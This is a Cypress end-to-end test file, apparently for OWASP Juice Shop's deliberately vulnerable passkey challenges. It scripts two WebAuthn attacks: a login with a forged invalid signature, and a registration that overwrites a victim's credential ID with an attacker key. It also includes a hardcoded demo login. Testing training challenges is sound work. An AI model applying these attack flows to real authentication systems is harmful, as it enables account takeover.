describe('/', () => {
  // The frontend passkey UI (Manage Passkeys page + "Login with Passkey" button) is not available
  // yet, so the honest virtual-authenticator happy path is deferred. Both challenges are driven here
  // through raw attack payloads with cy.request, mirroring the authoritative API tests in
  // test/api/webAuthn.test.ts. A real/virtual authenticator cannot forge either payload.

  describe('challenge "webauthnSignatureChallenge"', () => {
    it('should solve by submitting a login assertion with an invalid signature', () => {
      cy.request({
        method: 'POST',
        url: '/rest/webauthn/login-options',
        body: { email: 'passkey-user@juice-sh.op' }
      }).then((optionsResponse) => {
        const { challenge } = optionsResponse.body.options
        const { authToken } = optionsResponse.body

        cy.task('ForgePasskeyAssertion', { challenge }).then((assertion) => {
          cy.request({
            method: 'POST',
            url: '/rest/webauthn/login-verify',
            body: { assertion, authToken }
          }).then((verifyResponse) => {
            expect(verifyResponse.body.authentication.token).to.be.a('string')
          })
        })
      })

      cy.expectChallengeSolved({ challenge: 'Passkey Signature Forgery' })
    })
  })

  describe('challenge "webauthnCredentialOverwriteChallenge"', () => {
    it("should solve by registering the victim's credential ID with an attacker public key", () => {
      cy.request({
        method: 'POST',
        url: '/rest/user/login',
        body: { email: 'jim@juice-sh.op', password: 'ncc-1701' }
      }).then((loginResponse) => {
        const attackerToken = loginResponse.body.authentication.token

        cy.request({
          method: 'GET',
          url: '/rest/webauthn/register-options',
          headers: { Authorization: `Bearer ${attackerToken}` }
        }).then((optionsResponse) => {
          const { challenge } = optionsResponse.body.options
          const { regToken } = optionsResponse.body

          cy.task('ForgePasskeyAttestation', { challenge }).then(({ attestation }: any) => {
            cy.request({
              method: 'POST',
              url: '/rest/webauthn/register-verify',
              headers: { Authorization: `Bearer ${attackerToken}` },
              body: { attestation, regToken }
            }).then((verifyResponse) => {
              expect(verifyResponse.body.verified).to.equal(true)
            })
          })
        })
      })

      cy.expectChallengeSolved({ challenge: 'Passkey Credential Overwrite' })
    })
  })
})
